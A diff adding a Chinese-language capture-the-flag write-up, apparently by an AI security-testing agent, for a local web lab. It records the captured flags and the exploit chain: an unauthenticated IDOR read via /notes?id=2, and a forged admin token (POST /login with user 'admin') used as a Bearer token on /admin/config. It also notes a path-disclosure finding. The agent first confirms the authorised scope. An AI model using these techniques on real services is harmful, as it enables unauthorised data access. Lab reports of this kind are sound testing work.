@@ -1,0 +1,18 @@
+## FLAG 原文
+
+| FLAG | 获取链 | 引用 E-id |
+|---|---|---|
+| `FLAG{idor_user2}` | IDOR：`GET /notes?id=2`（无任何鉴权，未校验归属） | **E-002** |
+| `FLAG{api_chain_ok}` | admin token 链：`/login?user=admin` 伪造 token → `GET /admin/config`（Bearer） | **E-003** |
+
+## 利用链
+
+1. **授权确认**：`helmpi_validate_scope("http://127.0.0.1:18081")` → allow（exact 匹配），全程仅访问该地址。
+2. **IDOR**：根路径 hint 提示 `notes?id= may not check ownership`。实测 `id=1` → `alice-note`，`id=2` → `admin-secret-FLAG{idor_user2}`，`viewer: null`（无 token 也可读）。
+3. **admin token 链**：`/login` 返回 `token = base64({"uid": "1", "user": ""})`，`user` 字段由请求可控 —— `POST /login {"user":"admin"}` 直接签发 `eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=`（解码 `{"uid": "2", "user": "admin"}`）。
+4. **验证鉴权方式**：带普通 token 请求 `/notes?id=1`，`viewer` 由 `null` 变 `1`，确认传递头为 `Authorization: Bearer`。
+5. **取 flag**：无 token 访问 `/admin/config` → 403；带伪造 admin token → 200 `{"flag": "FLAG{api_chain_ok}", "debug": true}`。
+
+附带发现（未利用）：`/files?name=` 404 错误回显服务端绝对路径 `.../labs/weblab-api/<name>`，属信息泄露。
+
+**引用 E-id：E-002, E-003**（finding 已 record，证据在 `evidence/`）
